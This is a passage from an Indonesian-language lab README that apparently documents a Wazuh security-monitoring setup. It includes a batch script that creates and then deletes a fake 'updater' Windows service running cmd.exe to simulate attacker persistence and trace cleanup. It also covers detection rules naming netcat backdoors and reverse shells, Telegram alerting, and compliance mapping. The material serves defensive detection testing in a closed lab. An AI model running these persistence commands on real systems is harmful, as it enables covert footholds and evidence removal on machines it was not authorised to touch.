Penyerang sering membuat Windows Service palsu untuk menjaga persistensi di sistem korban. Service dengan nama generik seperti `updater` yang pointnya ke `cmd.exe` adalah indikator kuat aktivitas mencurigakan. Wazuh mendeteksi ini dari Windows Event Log (Event ID 7045 — service baru dibuat).

### Script: `attack-service.bat`

Dijalankan di Agent 2 (Windows) sebagai Administrator:

```bat
@echo off
REM Buat service mencurigakan — binary-nya cmd.exe (red flag besar)
sc create updater binPath= "C:\Windows\System32\cmd.exe"

REM Query untuk verifikasi service terbuat
sc query updater

REM Hapus service (simulasi attacker bersih-bersih)
sc delete updater
```

Tiga langkah yang disimulasikan:
1. **`sc create`** — membuat service `updater` dengan binary `cmd.exe`. Ini sangat mencurigakan karena service legitimate tidak pernah langsung memanggil command prompt.
2. **`sc query`** — verifikasi service berhasil dibuat. Output menunjukkan `STATE: STOPPED` dan `TYPE: WIN32_OWN_PROCESS`.
3. **`sc delete`** — menghapus service untuk membersihkan jejak, tapi Wazuh sudah keburu mencatat event pembuatannya.

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 7036 | Windows Service started or stopped | 3 |
| 7045 | New Windows service installed | 8 |
| 60154 | Administrators Group Changed | 12 |

### Cara Jalankan

Jalankan di Command Prompt sebagai **Administrator**:
```bat
attack-service.bat
```

### Hasil di Terminal

![Service Terminal](Documentation/2.png)
*Output CMD saat attack-service.bat dijalankan — terlihat `[SC] CreateService SUCCESS`, detail service `updater` (TYPE: WIN32_OWN_PROCESS, STATE: STOPPED), lalu `[SC] DeleteService SUCCESS`*

### Hasil di Dashboard

![Service Dashboard](Documentation/1.png)
*Threat Hunting Dashboard dari agent `Ascala` (Windows) — terlihat alert "New Windows Service Created" (rule ID 61138, level 5), "User account disabled or deleted" (60111, level 8), "Administrators Group Changed" (60154, level 12), dan berbagai Windows event lainnya pada 18 Mei 2026 pukul 23:34–23:36*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.groups: windows
agent.name: Ascala

Atau spesifik ke service event:
rule.id: 7045 OR rule.id: 61138
```

---

## Custom Detection Rules

File: `rules/custom-rules.xml`

![Custom Rules](Documentation/rule.png)
*Tampilan custom rules yang aktif di Wazuh Manager*

| Rule ID | Level | Kategori | Deskripsi |
|---------|-------|----------|-----------|
| 100001 | 10 | Brute Force | SSH Brute Force terdeteksi — 5+ failed login dalam 2 menit |
| 100002 | 13 | Brute Force | Massive SSH Brute Force — 10+ failed login attempts |
| 100010 | 10 | Web Attack | SQL Injection terdeteksi di web request |
| 100011 | 10 | Web Attack | XSS (Cross-Site Scripting) terdeteksi di web request |
| 100012 | 10 | Web Attack | Directory Traversal — percobaan akses file sistem |
| 100020 | 10 | FIM | File konfigurasi penting diubah di `/etc/` |
| 100021 | 12 | FIM | File executable sistem dimodifikasi (`/usr/bin/`, `/bin/`, dll) |
| 100030 | 10 | Privilege Escalation | Multiple sudo failures — 3+ gagal dalam 2 menit |
| 100031 | 14 | Privilege Escalation | User baru dibuat dengan root privileges (UID 0) |
| 100040 | 12 | Suspicious Activity | Netcat listener terdeteksi (potential backdoor) |
| 100041 | 14 | Suspicious Activity | Reverse shell attempt terdeteksi |

**Catatan level:**
- Level 10 → Medium (web attack, brute force awal, sudo abuse, FIM /etc)
- Level 12 → High (FIM binary sistem, netcat backdoor)
- Level 13 → High (massive brute force)
- Level 14 → Critical (user UID 0, reverse shell)

---

## Integrasi Telegram Bot

Alert otomatis dikirim ke Telegram setiap ada event level ≥ 3. Bot: `@wazuhalertcoba_bot`

![Telegram 1](Documentation/integrasi%20bot%20tele%201.png)
*Setup integrasi Telegram Bot di Wazuh*

![Telegram 2](Documentation/integrasi%20bot%20tele%202.png)
*Konfigurasi webhook dan token bot*

![Telegram 3](Documentation/integrasi%20bot%20tele%203.png)
*Contoh notifikasi alert yang masuk ke Telegram*

![Telegram 4](Documentation/integrasi%20bot%20tele%204.png)
*Format pesan alert Telegram — Level, Rule ID, Agent, Deskripsi*

---

## Compliance Mapping

Setiap alert di Wazuh juga dipetakan ke standar compliance internasional:

![GDPR](Documentation/grafik%20GDPR.png)
*Mapping alert ke GDPR*

![GDPR 2](Documentation/grafik%20GDPR%202.png)

![HIPAA](Documentation/grafik%20HIPAA.png)
*Mapping alert ke HIPAA*

![NIST 800-53](Documentation/grafik%20NIST%20800-53.png)
*Mapping alert ke NIST 800-53*

![PCI DSS](Documentation/grafik%20PCI%20DSS.png)
*Mapping alert ke PCI DSS*

![PCI DSS 2](Documentation/grafik%20PCI%20DSS%202.png)

![TSC](Documentation/grafik%20TSC.png)
*Mapping alert ke TSC*

![TSC 2](Documentation/grafik%20TSC%202.png)

![MITRE ATT&CK](Documentation/grafik%20mitre%20att%26ck.png)
*Mapping serangan ke MITRE ATT&CK framework*

---


> **PERINGATAN:** Semua simulasi ini dilakukan **hanya pada sistem milik sendiri** dalam lingkungan lab tertutup. **Jangan** jalankan pada sistem yang bukan milik kamu.
